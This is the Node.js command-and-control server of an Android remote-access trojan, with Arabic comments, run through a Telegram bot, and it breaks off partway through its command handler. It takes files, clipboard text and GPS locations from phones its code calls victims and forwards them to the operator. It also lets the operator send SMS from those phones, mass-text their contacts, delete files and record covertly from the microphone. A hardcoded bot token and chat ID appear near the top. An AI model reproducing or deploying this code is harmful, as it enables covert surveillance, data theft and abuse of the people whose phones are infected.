const express = require('express');
const webSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api'); 
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// البيانات الأساسية للبوت الخاص بك
const token = '8962035512:AAGxtvK_0IboGWh2KqNEUAqH48xdHbi3DIY';
const id = '8766671233';
const address = 'https://myappcontrol2026.onrender.com'; // رابط سيرفر Render لضمان بقائه حياً ومستيقظاً

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// 🖥️ لوحة تحكم ويب إحصائية خارقة للتحقق من ثبات الخادم والأجهزة
app.get('/', function (req, res) {
    let devicesHtml = '';
    if(appClients.size === 0) {
        devicesHtml = '<p style="color: #ff4d4d; font-weight: bold;">🔴 لا توجد أجهزة متصلة بالخادم حالياً.</p>';
    } else {
        appClients.forEach((value) => {
            devicesHtml += `
                <div style="background: #2d2d2d; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #00ff7f; text-align: right;">
                    🌐 <b>موديل الجهاز:</b> ${value.model} <br>
                    🔋 <b>نسبة البطارية:</b> ${value.battery} <br>
                    🤖 <b>إصدار أندرويد:</b> ${value.version} <br>
                    📡 <b>مزود الشبكة:</b> ${value.provider} <br>
                    💡 <b>مستوى السطوع:</b> ${value.brightness}
                </div>`;
        });
    }

    res.send(`
        <html lang="ar" dir="rtl">
        <head>
            <title>لوحة التحكم الخارقة والتشغيل السحابي</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #ffffff; text-align: center; padding: 30px; }
                .status-card { background: #1e1e1e; padding: 25px; border-radius: 12px; display: inline-block; box-shadow: 0px 6px 20px rgba(0,0,0,0.6); max-width: 600px; width: 100%; }
                .active { color: #00ff7f; font-weight: bold; }
                .container { margin-top: 20px; }
                h1 { margin-bottom: 5px; color: #00ff7f; }
                hr { border: 1px solid #333; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="status-card">
                <h1>🛡️ مركز إدارة الاختراق والتحكم المطور</h1>
                <p>مطور نظام السيرفر والتحكم العميق: <span class="active">انعزال الأسطورة محمد</span></p>
                <p>حالة الاتصال السحابي بالبوت: <span class="active">نشط ومحمي ومستقر تماماً ✅</span></p>
                <p>إجمالي الأجهزة النشطة حالياً: <span class="active">${appClients.size} جهاز</span></p>
                <hr>
                <h3>📱 قائمة وبيانات الأجهزة المتصلة بالخادم في الوقت الفعلي:</h3>
                <div class="container">${devicesHtml}</div>
            </div>
        </body>
        </html>
    `);
});

// 📥 استقبال الملفات المرفوعة والمسحوبة من التطبيق المستهدف
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const deviceModel = req.headers.model || "غير معروف";
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 📁 <b>ملف مسحوب بنجاح!</b>\n• من جهاز: <b>${deviceModel}</b>\n• المطور: <b>انعزال الأسطورة محمد</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/octet-stream',
        }).catch(err => console.log("Telegram Error:", err.message));
    res.send('OK');
});

// 📑 استقبال النصوص المسحوبة من الحافظة أو التقارير
app.post("/uploadText", (req, res) => {
    const deviceModel = req.headers.model || "غير معروف";
    appBot.sendMessage(id, `°• 📑 <b>بيانات مخرجة وجداول نصية</b>\n• من جهاز: <b>${deviceModel}</b>\n• المطور: <b>انعزال الأسطورة محمد</b>\n\n` + req.body['text'], { parse_mode: "HTML" })
        .catch(err => console.log("Telegram Error:", err.message));
    res.send('OK');
});

// 📍 استقبال بيانات الإحداثيات والموقع الجغرافي الحي
app.post("/uploadLocation", (req, res) => {
    const deviceModel = req.headers.model || "غير معروف";
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
        .then(() => {
            appBot.sendMessage(id, `°• 📍 <b>إحداثيات الموقع الجغرافي الخريطي</b>\n• من جهاز: <b>${deviceModel}</b>\n• المطور: <b>انعزال الأسطورة محمد</b>`, { parse_mode: "HTML" });
        }).catch(err => console.log("Telegram Error:", err.message));
    res.send('OK');
});

// 📡 إدارة قنوات اتصالات الأجهزة عبر منفذ الـ WebSockets المشدد
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "غير معروف";
    const battery = req.headers.battery || "غير معروف";
    const version = req.headers.version || "غير معروف";
    const brightness = req.headers.brightness || "غير معروف";
    const provider = req.headers.provider || "غير معروف";

    ws.uuid = uuid;
    appClients.set(uuid, { ws, model, battery, version, brightness, provider });

    appBot.sendMessage(id,
        `°• 📱 <b>اتصال خارق وجديد مستقر الآن</b>\n\n` +
        `• موديل الهاتف المستهدف : <b>${model}</b>\n` +
        `• مستوى البطارية الحالي : <b>${battery}</b>\n` +
        `• نظام الاندرويد المثبت : <b>${version}</b>\n` +
        `• شدة سطوع الشاشة : <b>${brightness}</b>\n` +
        `• شبكة ومزود الخدمة : <b>${provider}</b>\n\n` +
        `💡 <i>الجهاز بانتظار تلقي أوامرك الفورية من قائمة التحكم التفاعلية.</i>\n` +
        `• المطور: <b>انعزال الأسطورة محمد</b>`,
        { parse_mode: "HTML" }
    ).catch(err => console.log("Telegram Error:", err.message));

    ws.on('close', function () {
        appBot.sendMessage(id, `°• ❌ <b>انقطع اتصال الهاتف بالسيرفر:</b> <b>${model}</b>`, { parse_mode: "HTML" }).catch(() => {});
        appClients.delete(uuid);
    });

    ws.on('error', (err) => console.log(`[Socket Error] ${model}:`, err.message));
});

// ⚙️ معالجة الأوامر والردود والتحقق من الهوية المشددة للبوت
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    // جدار الحماية ضد المتطفلين ومنع اختراق بوت التحكم الخاص بك
    if (String(id) !== String(chatId)) {
        return appBot.sendMessage(chatId, '°• ⚠️ طلب الإذن مرفوض! السيرفر محمي بشكل كامل من قبل انعزال الأسطورة محمد.');
    }

    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text;

        if (replyText.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                { reply_markup: { force_reply: true } }
            );
        }
        
        if (replyText.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            const client = appClients.get(currentUuid);
            if (client && client.ws.readyState === webSocket.OPEN) {
                client.ws.send(`send_message:${currentNumber}/${message.text}`);
                appBot.sendMessage(id, '🚀 تم تمرير أمر إرسال الـ SMS للجهاز المستهدف وهو قيد التنفيذ الآن...');
            } else {
                appBot.sendMessage(id, '⚠️ تعذر تنفيذ الأمر: الهاتف المستهدف غير متصل بالسيرفر حالياً.');
            }
            currentNumber = ''; currentUuid = '';
        }

        if (replyText.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const client = appClients.get(currentUuid);
            if (client && client.ws.readyState === webSocket.OPEN) {
                client.ws.send(`send_message_to_all:${message.text}`);
                appBot.sendMessage(id, '🚀 تم إصدار الأمر لإرسال رسائل جماعية لكافة جهات الاتصال المسجلة بالهاتف المستهدف...');
            } else {
                appBot.sendMessage(id, '⚠️ تعذر التنفيذ: الجهاز غير متصل.');
            }
            currentUuid = '';
        }

        if (replyText.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const client = appClients.get(currentUuid);
            if (client && client.ws.readyState === webSocket.OPEN) {
                client.ws.send(`file:${message.text}`);
                appBot.sendMessage(id, '🚀 جاري النفاذ إلى الذاكرة الداخلية وسحب الملف من المسار المعطى...');
            } else {
                appBot.sendMessage(id, '⚠️ تعذر التنفيذ: الجهاز غير متصل.');
            }
            currentUuid = '';
        }

        if (replyText.includes('°• ادخل مسار الملف الذي تريد')) {
            const client = appClients.get(currentUuid);
            if (client && client.ws.readyState === webSocket.OPEN) {
                client.ws.send(`delete_file:${message.text}`);
                appBot.sendMessage(id, '🚀 تم توجيه أمر تدمير وحذف الملف من المسار المحدد بذاكرة الهاتف...');
            } else {
                appBot.sendMessage(id, '⚠️ تعذر التنفيذ: الجهاز غير متصل.');
            }
            currentUuid = '';
        }

        if (replyText.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const client = appClients.get(currentUuid);
            if (client && client.ws.readyState === webSocket.OPEN) {
                client.ws.send(`microphone:${message.text}`);
                appBot.sendMessage(id, `🚀 تم تفعيل الميكروفون الخفي وجاري التسجيل الحي لمدة ${message.text} ثانية...`);
            } else {
                appBot.sendMessage(id, '⚠️ تعذر التنفيذ: الجهاز غير متصل.');
            }
            currentUuid = '';
        }

